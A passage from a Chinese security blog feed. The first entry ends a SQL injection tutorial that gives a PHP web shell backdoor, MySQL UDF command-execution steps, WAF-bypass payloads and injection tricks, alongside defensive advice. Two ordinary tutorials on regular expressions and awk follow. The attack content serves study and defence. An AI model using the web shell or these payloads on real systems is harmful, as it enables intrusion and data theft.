class="hljs-keyword">and</span>!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$n</span>,<span class="hljs-variable">$z</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;system&quot;</span>))&#123;<span class="hljs-title function_ invoke__">ob_start</span>();<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;proc_open&quot;</span>))&#123;<span class="hljs-variable">$y</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(pipe,r),<span class="hljs-keyword">array</span>(pipe,w),<span class="hljs-keyword">array</span>(pipe,w)),<span class="hljs-variable">$t</span>);<span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>]))&#123;<span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>],<span class="hljs-number">512</span>);&#125;@<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$y</span>);&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;shell_exec&quot;</span>))&#123;<span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;passthru&quot;</span>))&#123;<span class="hljs-title function_ invoke__">ob_start</span>();<span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;popen&quot;</span>))&#123;<span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>,r);<span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$x</span>))&#123;<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$x</span>))&#123;<span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">512</span>);&#125;&#125;@<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$x</span>);&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;exec&quot;</span>))&#123;<span class="hljs-variable">$w</span>=<span class="hljs-keyword">array</span>();<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$w</span>);<span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>),<span class="hljs-variable">$w</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$w</span>=<span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样就把一个后门写入到了受害者的web目录，我们访问目录即可执行命令。</p><h3 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h3><h4 id="udf命令执行"><a href="#udf命令执行" class="headerlink" title="udf命令执行"></a>udf命令执行</h4><p>如果secure_file_priv为null，类似于写入outfile，这样就无法使用udf提权，如果value值为空，则可以继续尝试</p><ol><li>show variables like “%plugin%”</li><li>创建相应的plugin目录</li><li>可以从msf或者sqlmap上获取现成的dll文件(Linux中使用so文件)，转换成十六进制序列，然后写入：</li></ol><p>select 0x+16进制序列 into dumpfile “mysql dir&#x2F;lib&#x2F;plugin&#x2F;lib_mysqludf_sys_32.dll”; </p><p>create function sys_eval returns string soname ‘lib_mysqludf_sys_32.dll’</p><p>然后就可以通过调用函数执行命令：</p><p>select sys_eval(‘net user’); </p><p>经过测试，<strong>如果mysql以普通用户权限运行，执行udf提权后还是普通用户权限</strong>，似乎并不能让原本的低权限用户获取更高级的权限，只是能让你在mysql中执行系统命令而已。因此网上其他博客说的是提权是不准确的。这里提权可以解释为从网站用户权限提升到数据库软件用户权限，比如数据库软件是普通用户权限运行，提权后就只能到普通用户权限，如果是管理员身份运行，则提权后可以到administrator或者system权限。</p><h4 id="mof提权（未经尝试）"><a href="#mof提权（未经尝试）" class="headerlink" title="mof提权（未经尝试）"></a>mof提权（未经尝试）</h4><p>新的Windows不适用</p><h4 id="写入启动项（未经尝试）"><a href="#写入启动项（未经尝试）" class="headerlink" title="写入启动项（未经尝试）"></a>写入启动项（未经尝试）</h4><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><h3 id="控制权限"><a href="#控制权限" class="headerlink" title="控制权限"></a>控制权限</h3><p>普通用户和管理员权限要做严格的区分，在权限设计阶段，对于应用软件的使用者，没有必要给它们数据库对象建立和删除的权限，即使他们使用SQL注入使用恶意代码，也无法执行很多特殊的功能，这样可以最大限度地减少注入对系统的危害。</p><h3 id="使用参数化语句"><a href="#使用参数化语句" class="headerlink" title="使用参数化语句"></a>使用参数化语句</h3><p>如果在编写SQL语句的时候，用户输入的变量不是直接嵌入到SQL语句，而是通过参数来传递这个变量的话，那么就可以有效的防治SQL注入式攻击。也就是说，用户的输入绝对不能够直接被嵌入到SQL语句中。</p><p>比如使用一些ORM（Object&#x2F;Relation Mapping, 即对象&#x2F;关系数据库映射）框架就可以实现上述这些功能，比如在使用Mybatis时，使用#{}会在预编译期，生成两个  ？，作为占位符，传入的参数只会作为字段的值，不会拼接到SQL语句中，这样就可以达到防止SQL注入的问题。然而使用时如果采用${}的方式，预编译时还是会将值拼接到SQL语句中，还是会产生SQL注入的问题。</p><h4 id="什么时候不能用参数化语句？"><a href="#什么时候不能用参数化语句？" class="headerlink" title="什么时候不能用参数化语句？"></a>什么时候不能用参数化语句？</h4><p>表名、列名需要动态传入的时候无法预编译，in、order by后面的字段无法参数化，因为参数化本质是添加‘’包裹字段，由于SQL自身原因这些字段不能加引号（真正的Oracle数据库实现预编译不是这么简单，如下述）</p><p>预编译防止SQL注入的原理是提前编译SQL语句，将所有的用户输入都当做『数据』，而非『语法』</p><p>通常来说，一条SQL语句从传入到运行经历了生成语法树、执行计划优化、执行这几个阶段。在预编译过程中，数据库首先接收到带有预编译占位符?的SQL语句，解析生成语法树(Lex)，并缓存在cache中，然后接收对应的参数信息，从cache中取出语法树设置参数，然后再进行优化和执行。由于参数信息传入前语法树就已生成，执行的语法结构也就无法因参数而改变，自然也就杜绝了SQL注入的出现。</p><p>表名与列名是不能被预编译的，这是由于在预编译生成语法树的过程中，预处理器在检查解析后的语法树时，会确定数据表和数据列是否存在，此两者必须为具体值，不能被占位符?所替代，这就导致了ORDER BY、GROUP BY后同样不能使用#，只能使用$。而对于此场景防止SQL注入，不建议使用过滤或转义手段，而是将表名、列名定义为常量，当用户输入匹配某一常量时，再将此常量传入SQL语句中，否则就使用默认值。</p><h4 id="参数化预编译的破绽"><a href="#参数化预编译的破绽" class="headerlink" title="参数化预编译的破绽"></a>参数化预编译的破绽</h4><p>由Mybatis推广开来，往往预编译不容易办到或办不到的场景，在日常渗透测试与代码审计中更应引起我们的关注。总结如下：</p><ol><li>白盒审计中PDO、PreparedStatement中开发者直接拼接SQL语句的行为，很多开发者以为使用了安全的类库就保证了安全，殊不知错误的用法仍会导致漏洞。</li><li>白盒审计中ORDER BY后的表名动态传入的SQL语句；渗透测试中允许用户传入按某个字段进行排序的行为，这很有可能是直接拼接的。</li><li>白盒审计中ORDER BY后排序方式(ASC&#x2F;DESC)动态传入的SQL语句；渗透测试中允许用户选择正序倒序排列的行为，需要抓包查看是否直接传入ASC&#x2F;DESC，若是则很有可能存在拼接行为。</li><li>白盒审计中模糊查询是否拼接；渗透测试中针对搜索行为进行SQL注入测试。</li><li>白盒审计中IN语句后是否拼接。</li></ol><p>这样有针对性的进行试探和检查，能更有效的帮助我们找到漏洞。</p><h3 id="对用户的输入进行验证"><a href="#对用户的输入进行验证" class="headerlink" title="对用户的输入进行验证"></a>对用户的输入进行验证</h3><p>总体来说，防御SQL注入式攻击可以采用两种方法，一是上面说的<strong>强迫使用参数化语句来传递用户输入的内容</strong>；第二个就是<strong>加强对用户输入内容的检查与验证</strong>。</p><p>假设来自用户的输入都是不安全的，来自用户的内容都要经过检查，如果发现有转义字符、注释字符、二进制数据等特殊数据，可以拒绝处理。在不影响数据库应用的前提下，过滤和转义引号、注释等容易引发SQL注入的特殊字符。</p><h3 id="隐藏错误信息"><a href="#隐藏错误信息" class="headerlink" title="隐藏错误信息"></a>隐藏错误信息</h3><p>错误信息是不需要展现给用户的，因此当数据库异常时不要把错误信息传递给客户端。</p><h3 id="多使用数据库自带的安全参数"><a href="#多使用数据库自带的安全参数" class="headerlink" title="多使用数据库自带的安全参数"></a>多使用数据库自带的安全参数</h3><h3 id="使用漏洞扫描工具寻找可能被攻击的点"><a href="#使用漏洞扫描工具寻找可能被攻击的点" class="headerlink" title="使用漏洞扫描工具寻找可能被攻击的点"></a>使用漏洞扫描工具寻找可能被攻击的点</h3><h3 id="设置陷阱账号"><a href="#设置陷阱账号" class="headerlink" title="设置陷阱账号"></a>设置陷阱账号</h3><p>设置一个蜜罐，比如将admin账号设置为伪装的管理账户，口令非常复杂难以破解，吸引攻击者分析破解。</p><h3 id="禁用某些参数"><a href="#禁用某些参数" class="headerlink" title="禁用某些参数"></a>禁用某些参数</h3><p>某些参数可能引起getshell，比如mysql的secure_file_priv参数，应当将其设置为不允许导入导出。</p><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><p><a href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Usage · sqlmapproject&#x2F;sqlmap Wiki · GitHub</a></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>SQLMap 整个运行机制：</p><ol><li>获取 url、thread、headers 等信息存储至变量中；</li><li>网站存活性检测；</li><li>WAF 检测 &amp; WAF 类型识别；</li><li>稳定性检测；</li><li>注入检测。</li></ol><h2 id="WAF以及绕过WAF"><a href="#WAF以及绕过WAF" class="headerlink" title="WAF以及绕过WAF"></a>WAF以及绕过WAF</h2><h3 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a>大小写变换</h3><p>比如WAF拦截了union，那就使用Union、UnloN等方式绕过。</p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ol><li>WAF检测敏感字~，则可以用0x7e代替，如extractvalue(1,concat(‘~’,database())) 可以写成extractvalue(1,concat(0x7e,database()))</li><li>可以用%09、%0a、%0b、%0c、%0d、%a0、&#x2F;**&#x2F;、&#x2F;<em>somewords</em>&#x2F;等来替换空格</li><li>WAF检测敏感字select,可以在URL中将select变成%73elEcT编码结合大小写变换绕过WAF</li></ol><h3 id="利用注释符"><a href="#利用注释符" class="headerlink" title="利用注释符"></a>利用注释符</h3><p>适用于WAF只过滤了一次危险的语句，而没有阻断整个查询语句的场合，比如：原查询语句为: ?id&#x3D;1 union select 1,2,3，对于这条查询,WAF过滤了一次union和select，我们可以利用注释将注释里面的关键字过滤掉，如?id&#x3D;1&#x2F;*union*&#x2F;union &#x2F;*select*&#x2F;select 1,2,3</p><h3 id="重复写"><a href="#重复写" class="headerlink" title="重复写"></a>重复写</h3><p>适用于WAF只过滤一次敏感字的情况，WAF过滤敏感字union，但只过滤一次，则可以写出类似ununionion</p><h3 id="比较符替换"><a href="#比较符替换" class="headerlink" title="比较符替换"></a>比较符替换</h3><p>!&#x3D;不等于，&lt;&gt;不等于，&lt;小于，&gt;大于，这些都可以用来替换&#x3D;来绕过</p><h3 id="同功能函数替换"><a href="#同功能函数替换" class="headerlink" title="同功能函数替换"></a>同功能函数替换</h3><p>假如substring()被WAF过滤，但substring()可以用同功能的mid()，substr()等函数来替换</p><p>floor() &#x3D;&#x3D;&gt;  updatexml()，extractvalue()</p><p>Substring() &#x3D;&#x3D;&gt;  Mid()，Substr()，Lpad()，Rpad()，Left()</p><p>concat() &#x3D;&#x3D;&gt;  concat_ws()，group_concat()</p><p>limit 0，1  &#x3D;&#x3D;&gt;  limit1 offset 0</p><p>and  &#x3D;&#x3D;&gt; &amp;&amp; </p><p>or  &#x3D;&#x3D;&gt; ||</p><p>&#x3D; &#x3D;&#x3D;&gt;  &lt;，&gt;</p><p>&#x3D; &#x3D;&#x3D;&gt;  like</p><p>Sleep()  &#x3D;&#x3D;&gt; benchmark()</p><h3 id="00-截断"><a href="#00-截断" class="headerlink" title="%00 截断"></a>%00 截断</h3><p>部分WAF在解析参数的时候当遇到%00时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。</p><h3 id="协议未覆盖、异常Method绕过"><a href="#协议未覆盖、异常Method绕过" class="headerlink" title="协议未覆盖、异常Method绕过"></a>协议未覆盖、异常Method绕过</h3><p>有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过，或者检测GET请求使用POST发送绕过，修改方法请求头</p><p>部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。</p><h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><p>部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测</p><h3 id="单引号被过滤"><a href="#单引号被过滤" class="headerlink" title="单引号被过滤"></a>单引号被过滤</h3><p>如果语句是select * from xxx where id&#x3D;&#39;1&#39; and pwd&#x3D;’xxx’，我们可以尝试将id设置为 1\，pwd设置为or 1&#x3D;1–+，此时sql语句就变成 select * from xxx where id&#x3D;&#39;1\&#39; and pwd&#x3D;’or 1&#x3D;1–+’，SQL语句中id就变成了1\&#39; and pwd&#x3D;，如果返回逻辑为true即可进行SQL注入</p><h3 id="列名未知如何处理"><a href="#列名未知如何处理" class="headerlink" title="列名未知如何处理"></a>列名未知如何处理</h3><p>查询information_schema表，如果该表无权限访问，可以利用联合查询，进行查询时的语句字段必须和指定表中的字段数一样，不然会报错，例如select 1,2,3 union select * from xxx，通过这种将未知原列名转换为其他值的方法，就可以注入出所有的数据</p><h3 id="limit之后如何注入"><a href="#limit之后如何注入" class="headerlink" title="limit之后如何注入"></a>limit之后如何注入</h3><p>procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) ;</p><p>通过分析select查询结果对现有的表的每一列给出优化的建议，语法：SELECT … FROM … WHERE … PROCEDURE ANALYSE([max_elements,[max_memory]])</p><h3 id="information-schema被过滤"><a href="#information-schema被过滤" class="headerlink" title="information_schema被过滤"></a>information_schema被过滤</h3><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>在mysql系统库也有两个表中包含部分表名：</p><p>innodb_index_stats<br>innodb_table_stats</p><p>当我们通过<code>database()</code>获得数据库名后就可以利用sys.schema_auto_increment_columns视图去获得带有自增列的<strong>表名和列名</strong></p><p>通过统计视图sys.schema_table_statistics</p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><p>利用重复列名报错：</p><p>select * from (select * from users as a join users b using (,,,))c;</p><p>其中(,,,)中为已知的列名，都不知道时去掉using (,,,)</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本正则与扩展正则</title>
    <link href="/blog/2022/11/25/%E5%9F%BA%E6%9C%AC%E6%AD%A3%E5%88%99%E4%B8%8E%E6%89%A9%E5%B1%95%E6%AD%A3%E5%88%99/"/>
    <url>/blog/2022/11/25/%E5%9F%BA%E6%9C%AC%E6%AD%A3%E5%88%99%E4%B8%8E%E6%89%A9%E5%B1%95%E6%AD%A3%E5%88%99/</url>
    
    <content type="html"><![CDATA[<p><strong>上一篇学习了一些文本处理的工具之后，发现grep支持的正则包含基本正则和扩展正则，之前没有系统的学习过这些正则的细节和区别，现在学习一下。</strong></p><p><img src="/images/fj62.jpg"></p><span id="more"></span><h2 id="基本正则表达式-BRE-basic-regular-expressions"><a href="#基本正则表达式-BRE-basic-regular-expressions" class="headerlink" title="基本正则表达式(BRE, basic regular expressions)"></a>基本正则表达式(BRE, basic regular expressions)</h2><h3 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h3><table><thead><tr><th align="center">正则符号</th><th align="center">符号的含义</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">匹配任意单个字符</td></tr><tr><td align="center">[]</td><td align="center">匹配指定范围内的任意字符</td></tr><tr><td align="center">[^]</td><td align="center">匹配指定范围外的任意字符</td></tr><tr><td align="center">[:alnum:]</td><td align="center">字母和数字</td></tr><tr><td align="center">[:alpha:]</td><td align="center">任何英文大小写字符，即A-Z,a-z</td></tr><tr><td align="center">[:lower:]</td><td align="center">小写字母</td></tr><tr><td align="center">[:upper:]</td><td align="center">大写字母</td></tr><tr><td align="center">[:black:]</td><td align="center">空白字符（空格和TAB）</td></tr><tr><td align="center">[:space:]</td><td align="center">水平和垂直空白字符（范围大于上一个，包含\n等）</td></tr><tr><td align="center">[:cntrl:]</td><td align="center">不可打印控制字符（退格、删除等）</td></tr><tr><td align="center">[:digit:]</td><td align="center">十进制数字</td></tr><tr><td align="center">[:xdigit:]</td><td align="center">十六进制数字</td></tr><tr><td align="center">[:graph:]</td><td align="center">可打印非空白字符</td></tr><tr><td align="center">[:print:]</td><td align="center">可打印字符</td></tr><tr><td align="center">[:pumct:]</td><td align="center">标点符号</td></tr></tbody></table><h4 id="几个小例子"><a href="#几个小例子" class="headerlink" title="几个小例子"></a>几个小例子</h4><p>[]匹配其中的任一字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@LAPTOP-MRV29Q6U$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abcdABCD&quot;</span>|grep <span class="hljs-string">&quot;a[a-z]&quot;</span><br>ab<br></code></pre></td></tr></table></figure><p>[^]匹配非其中的字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@LAPTOP-MRV29Q6U$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abcdABCD&quot;</span>|grep <span class="hljs-string">&quot;A[^a-z]&quot;</span><br>AB<br></code></pre></td></tr></table></figure><h3 id="匹配次数"><a href="#匹配次数" class="headerlink" title="匹配次数"></a>匹配次数</h3><p>用来指定所给出的匹配字符，出现的次数，满足限定才会被匹配出来</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">*前的字符出现0次或者任意次</td></tr><tr><td align="center">.*</td><td align="center">任意长度的任意字符串</td></tr><tr><td align="center">?</td><td align="center">匹配前面的字符0或者1次</td></tr><tr><td align="center">\+</td><td align="center">匹配前面的字符串至少一次，即大于等于一次</td></tr><tr><td align="center">\ {n\ }</td><td align="center">匹配前面的字符n次</td></tr><tr><td align="center">\ {m,n\ }</td><td align="center">匹配前面的字符大于等于m次，小于等于n次</td></tr><tr><td align="center">\ {,n\ }</td><td align="center">匹配前面的字符小于等于n次</td></tr><tr><td align="center">\ {m,\ }</td><td align="center">匹配前面的字符大于等于m次</td></tr></tbody></table><h3 id="位置锚定"><a href="#位置锚定" class="headerlink" title="位置锚定"></a>位置锚定</h3><p>确定匹配子串出现的位置。</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">^</td><td align="center">匹配行首，用在pattern的最左侧</td></tr><tr><td align="center">$</td><td align="center">匹配行尾，用在pattern的最右侧</td></tr><tr><td align="center">\&lt;pattern</td><td align="center">以对应匹配为词首的单词</td></tr><tr><td align="center">pattern\&gt;</td><td align="center">以对应匹配为词尾的单词</td></tr><tr><td align="center">\b</td><td align="center">表示单词的边界，既可以表示单词的词首，也可以表示单词的词尾</td></tr></tbody></table><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p>通过\ (\ ) 将一个或多个字符捆绑在一起，当作一个整体进行处理，如：\ (root\ )\ + 匹配 root 字符至少一次 如 root，rootroot，rootrootroot</p><p><strong>后向引用：</strong>\1 表示从左侧起第一个左括号以及与之匹配右括号之间的模式所匹配到的字符结果，而不是相应的模式；同样，\2代表左起第二个左括号和与其匹配的右括号之间的模式所匹配到的结果</p><p><strong>\|:</strong> 匹配或条件，比如：\ (C\ |c \ )at 可以匹配Cat 或cat。</p><h2 id="扩展正则表达式-ERE-extended-regular-expressions"><a href="#扩展正则表达式-ERE-extended-regular-expressions" class="headerlink" title="扩展正则表达式(ERE, extended regular expressions)"></a>扩展正则表达式(ERE, extended regular expressions)</h2><p>扩展正则表达式可以认为是对基础正则的简化，直观上的表现 ：<br>如进行分组时 基础正则使用\(\)，而扩展正则，则直接使用()<br>grep sed 等文本处理工具，配上指定的选项，可进行扩展正则的使用， grep -E 或 egrep</p><h3 id="基本语法、位置锚定"><a href="#基本语法、位置锚定" class="headerlink" title="基本语法、位置锚定"></a>基本语法、位置锚定</h3><p>与基础正则一致</p><h3 id="匹配次数-1"><a href="#匹配次数-1" class="headerlink" title="匹配次数"></a>匹配次数</h3><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">*前的字符出现0次或者任意次</td></tr><tr><td align="center">.*</td><td align="center">任意长度的任意字符串</td></tr><tr><td align="center">?</td><td align="center">匹配前面的字符0或者1次</td></tr><tr><td align="center">+</td><td align="center">匹配前面的字符串至少一次，即大于等于一次</td></tr><tr><td align="center">{n}</td><td align="center">匹配前面的字符n次</td></tr><tr><td align="center">{m,n }</td><td align="center">匹配前面的字符大于等于m次，小于等于n次</td></tr><tr><td align="center">{,n }</td><td align="center">匹配前面的字符小于等于n次</td></tr><tr><td align="center">{m,}</td><td align="center">匹配前面的字符大于等于m次</td></tr></tbody></table><h3 id="分组-1"><a href="#分组-1" class="headerlink" title="分组"></a>分组</h3><p>通过() 将一个或多个字符捆绑在一起，当作一个整体进行处理，如：(root)+ 匹配 root 字符至少一次 如 root，rootroot，rootrootroot</p><p><strong>后向引用：</strong>\1 表示从左侧起第一个左括号以及与之匹配右括号之间的模式所匹配到的字符结果，而不是相应的模式；同样，\2代表左起第二个左括号和与其匹配的右括号之间的模式所匹配到的结果</p><p><strong>|:</strong> 匹配或条件，比如：(C |c )at 可以匹配Cat 或cat。</p><h2 id="二者之间的区别"><a href="#二者之间的区别" class="headerlink" title="二者之间的区别"></a>二者之间的区别</h2><p>这两者的区别是：正则表达式的扩展规范和基本规范基本相同。只是在基本规范下，有些字符（?  +  {}  |  () ）应解释为普通字符，要表达上述特殊含义，则需要加 \ 转义。反之，在扩展规范下，?  +  {}  |  () 应被理解成特殊含义，要取其字面值，也要对其进行 \ 转义。</p>]]></content>
    
    
    
    <tags>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中常用的文本处理工具学习</title>
    <link href="/blog/2022/11/21/Linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2022/11/21/Linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>Linux中有很多骚操作的文本处理命令工具，可以快速有效地完成一些文件的筛选工作，学习一下</strong></p><p><img src="/images/fj61.jpg"></p><span id="more"></span><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>awk是Linux下一款编程及数据操作语言，经常用于数据格式化输出，也就是将数据按照我们想要的方式来显示，并且可以做一些基本的统计工作。</p><p>它的运行模式是先进行预处理，然后逐行处理，最后再进行一次最终处理。一般情况下使用较多的是逐行处理某些满足条件的行，比如我们想输出某某列，通过指定分隔符我们很容易对列进行操作。</p><p>除此之外我们还可以使用预处理去预定义一些变量，通过逐行处理来修改变量，最后通过最终处理来打印变量，这种方式就可以做一些基本的统计工作。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>Usage: awk [POSIX or GNU style options] -f progfile [–] file …<br>Usage: awk [POSIX or GNU style options] [–] ‘program’ file …</p><p>使用program的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN&#123; commands &#125; /pattern/ &#123;commands&#125; END&#123; commands &#125;&#x27;</span> file<br></code></pre></td></tr></table></figure><ul><li><p>BEGIN{ commands }：开始块就是在程序启动的时候执行的代码部分，并且它在整个过程中只执行一次。一般情况下，我们可以在开始块中初始化一些变量。<br>注意：开始块部分是可选的，你的程序可以没有开始块部分。</p></li><li><p>&#x2F;pattern&#x2F; {commands}：pattern 部分匹配该行内容成功后，才会执行 commands 的内容。</p></li><li><p>END{ commands }：结束块是在程序结束时执行的代码。<br>注意：结束块部分也是可选的</p></li></ul><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">POSIX options:          GNU long options: (standard)<br>        -f progfile             --file=progfile<br>        -F fs                   --field-separator=fs<br>        -v var=val              --assign=var=val<br></code></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-f</td><td>–f progfile，从program脚本文件中读取awk命令</td></tr><tr><td>-F</td><td>-F ‘ ‘ 或者 -F ‘pattern’，使用该选项可以改变列字段的分隔符</td></tr><tr><td>-v</td><td>-v var&#x3D;0 赋值一个用户定义的变量val值为0</td></tr></tbody></table><h3 id="常用系统变量"><a href="#常用系统变量" class="headerlink" title="常用系统变量"></a>常用系统变量</h3><table><thead><tr><th align="left"><strong>变量</strong></th><th align="left"><strong>描述（常用的，还有很多其他的没怎么常用）</strong></th></tr></thead><tbody><tr><td align="left">$n</td><td align="left">$1 当前记录的第1个字段的内容</td></tr><tr><td align="left">$0</td><td align="left">整行数据的内容</td></tr><tr><td align="left">FS</td><td align="left">字段分隔符 (默认是空格)</td></tr><tr><td align="left">OFS</td><td align="left">输出字段的分隔符（默认是空格）</td></tr><tr><td align="left">RS</td><td align="left">行分隔符（默认以\n作为一行的结尾），单行分割成多行用到</td></tr><tr><td align="left">NR</td><td align="left">行号，从1开始，多文件时候也是连续接着计数</td></tr><tr><td align="left">FNR</td><td align="left">各文件分别计数的行号，多文件的时候会和NR不同，它会重新计数</td></tr><tr><td align="left">NF</td><td align="left">一行中字段数量，最后一个字段内容可以用<code>$NF</code>取出</td></tr><tr><td align="left">ARGC</td><td align="left">命令行参数的数目</td></tr><tr><td align="left">ARGV</td><td align="left">包含命令行参数的数组，第一个参数是命令 awk</td></tr></tbody></table><h3 id="循环分支和数组"><a href="#循环分支和数组" class="headerlink" title="循环分支和数组"></a>循环分支和数组</h3><p>语句之间使用分号分隔，循环使用for循环，类似于其他编程语言，分支使用的if：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(condition)<br>&#123;<br>action <span class="hljs-number">1</span>;<br>action <span class="hljs-number">2</span>;<br>...<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span><br>&#123;<br>action <span class="hljs-number">1</span>;<br>action <span class="hljs-number">2</span>;<br>...<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>action <span class="hljs-number">1</span>;<br>action <span class="hljs-number">2</span>;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 